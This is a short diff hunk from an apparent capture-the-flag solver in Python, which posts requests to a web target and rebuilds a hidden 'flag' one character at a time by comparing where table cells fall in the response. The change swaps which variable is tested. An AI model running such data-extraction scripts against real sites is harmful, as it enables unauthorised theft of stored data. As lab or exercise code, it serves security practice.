@@ -14,7 +14,7 @@ for i in range(48):
         }
         t=requests.post(url,data=data,timeout=1)
         t=requests.get(url,cookies=cookie,timeout=1).text
-        if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
+        if t.find(f"<td>{index}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
             print(flag)
         break
